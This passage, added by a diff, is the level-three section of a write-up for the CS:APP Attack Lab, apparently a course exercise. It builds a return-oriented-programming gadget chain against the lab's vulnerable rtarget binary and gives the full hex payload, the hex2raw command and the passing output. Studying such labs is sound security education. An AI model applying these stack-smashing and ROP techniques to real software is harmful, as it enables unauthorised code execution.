@@ -346,3 +346,60 @@ Putting it to `rtarget.exploit.l2.txt`, we can execute and pass the game:
 ```
 
 ## Level 3
+This time, we are going to use return-oriented programming to head to `<touch3>`. Instead of
+passing the direct long integer, we will pass a pointer to the ascii encoded string of our cookie.
+Recall that in `ctarget`, we put the ascii string at the stack bottom, which is highest frame of
+our overflowed buffer. So we will try to pass the correct stack address to `%rdi` before jumpping
+`<touch3>`. By investigating the reference instruction table and the provided gadget farm, we 
+find a way to read the value of `%rsp`, even it is a dynamic value from one run to anther. Moreover,
+we will execute a summation of `add_xy(x=%rsp,y=constant)` to get the correct address of our ascii
+string. The sequence of gadgets' assembly code along with its objective are shown in below:
+```asm
+  movq %rsp,%rax            ################################################
+  ret                       # The first part consists of two gadgets
+  movq %rax,%rdi            # which pass the stack top value to %rdi
+  ret                       ################################################
+  popq %rax                 #
+  ret                       #
+  movl %eax,%edx            # The second part pop a preset constant value
+  ret                       # and pass from %eax to %esi
+  movl %edx,%ecx            #
+  ret                       #
+  movl %ecx,%esi            #
+  ret                       ################################################
+  lea (%rdi,%rsi,1),%rax    # The third part sums up the stack value %rdi
+  ret                       # and a constant %rsi, whose result should be
+  movq %rax,%rdi            # the address of our cookie string in ascii.
+  ret                       # Finally set the sum value to rdi and goto <touch3>
+                            ################################################
+
+```
+By translating each gadget to the corresponding address, we arrive at our solution:
+```
+  00 00 00 00 00 00 00 00
+  00 00 00 00 00 00 00 00
+  00 00 00 00 00 00 00 00
+  00 00 00 00 00 00 00 00
+  00 00 00 00 00 00 00 00
+  06 1a 40 00 00 00 00 00    /* the address of 1st gadget (movq %rsp,%rax 48 89 e0 c3 # from <addval_190>) */
+  a2 19 40 00 00 00 00 00    /* the address of 2nd gadget (movq %rax,%rdi 48 89 c7 c3 # from <addval_273>) */
+  cc 19 40 00 00 00 00 00    /* the address of 3rd gadget (popq %rax 58 90 c3 # from <getval_280>) */
+  48 00 00 00 00 00 00 00    /* a constant 72 (0x48) for the exact cookie string address calculation */
+  dd 19 40 00 00 00 00 00    /* the address of 4th gadget (movl %eax,%edx 89 c2 90 c3 # from <getval_481>) */
+  34 1a 40 00 00 00 00 00    /* the address of 5th gadget (movl %edx,%ecx 89 d1 38 c9 c3 # from <getval_159>) */
+  13 1a 40 00 00 00 00 00    /* the address of 6th gadget (movl %ecx,%esi 89 ce 90 90 c3 # from <addval_436>) */
+  d6 19 40 00 00 00 00 00    /* the address of 7th gadget (lea (%rdi,%rsi,1),%rax 48 8d 04 3d c3 # from <add_xy>) */
+  a2 19 40 00 00 00 00 00    /* the address of 8th gadget (movq %rax,%rdi 48 89 c7 90 c3 # from <setval_426>) */
+  fa 18 40 00 00 00 00 00    /* the address of <touch3> */
+  35 39 62 39 39 37 66 61    /* the cookie string in ascii */
+  00 00 00 00 00 00 00 00    /* put '\0' to end of c string */
+```
+Put the exploit to `rtarget.exploit.l3.txt`, we can pass `<touch3>`:
+```sh
+  03-Attack-Lab/src > cat rtarget.exploit.l3.txt | ./hex2raw | ./rtarget -q
+    Cookie: 0x59b997fa
+    Type string:Touch3!: You called touch3("59b997fa")
+    Valid solution for level 3 with target rtarget
+    PASS: ...
+```
+
